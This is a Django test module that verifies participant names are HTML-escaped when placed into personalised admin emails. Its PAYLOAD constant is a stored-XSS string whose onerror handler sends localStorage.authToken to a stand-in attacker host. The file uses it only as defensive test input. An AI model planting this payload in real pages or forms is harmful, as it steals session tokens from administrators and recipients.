"""Recipient-controlled values must not become markup in a personalised email.

`full_name` is typed by the participant. It is substituted into the HTML body of
every personalised email, so left raw it is an injection point: into the inbox of
everyone on the send list, and — before the preview was sandboxed — into the
admin's own session, where the auth token lives in localStorage.
"""

import json

from django.test import TestCase, override_settings

from api.models import Account, EmailQueueItem, Participant
from api.services.auth_service import generate_session


PAYLOAD = '<img src=x onerror="fetch(\'//evil.example/\'+localStorage.authToken)">'


@override_settings(EMAIL_HOST="smtp.example.com")
class EmailTemplateEscapingTests(TestCase):
    def setUp(self):
        self.admin = Account.objects.create(
            username="sender-admin",
            email="sender@example.com",
            password_hash="x",
            role=Account.ROLE_ADMIN,
            full_name="Ban to chuc",
        )
        self.token = generate_session(self.admin)

        self.victim = Account.objects.create(
            username="attacker",
            email="attacker@example.com",
            password_hash="x",
            role=Account.ROLE_PARTICIPANT,
        )
        Participant.objects.create(
            account=self.victim,
            mssv="SV999",
            email="attacker@example.com",
            full_name=PAYLOAD,
        )

    def _send(self, subject, html_body):
        response = self.client.post(
            "/api/admin/send-email",
            data=json.dumps({
                "recipient_type": "specific",
                "usernames": [self.victim.username],
                "subject": subject,
                "html_body": html_body,
            }),
            content_type="application/json",
            HTTP_AUTHORIZATION=f"Bearer {self.token}",
        )
        self.assertIn(response.status_code, (200, 202), response.content)
        return response

    def _queued_body(self):
        item = EmailQueueItem.objects.order_by("-id").first()
        self.assertIsNotNone(item, "email should have been queued")
        return item.html_body

    def test_a_name_cannot_inject_markup_into_the_email_body(self):
        self._send("Chao {{ten}}", "<p>Xin chao {{ten}}, hen gap ban.</p>")

        body = self._queued_body()

        # The name is present, but only as text.
        self.assertIn("&lt;img", body)
        self.assertNotIn("<img", body)
        self.assertNotIn("onerror=\"fetch", body)

    def test_the_senders_own_markup_still_renders(self):
        """Escaping applies to the substituted value, never to the template."""
        self._send("Thong bao", "<p><strong>Quan trong</strong>: xin chao {{ten}}.</p>")

        body = self._queued_body()

        self.assertIn("<p><strong>Quan trong</strong>", body)
        self.assertIn("&lt;img", body)

    def test_the_subject_is_not_html_escaped(self):
        """The subject is plain text; escaping it would surface literal entities."""
        self._send("Ket qua & xep hang cho {{ten}}", "<p>Noi dung</p>")

        item = EmailQueueItem.objects.order_by("-id").first()

        self.assertIn("Ket qua & xep hang", item.subject)
        self.assertNotIn("&amp;amp;", item.subject)

    def test_every_placeholder_alias_is_escaped(self):
        """`{{ten}}` and `{{ho_ten}}` read different context keys — both are data."""
        self._send("Chao", "<p>{{ten}}|{{name}}|{{full_name}}|{{ho_ten}}</p>")

        body = self._queued_body()

        self.assertEqual(body.count("&lt;img"), 4)
        self.assertNotIn("<img", body)
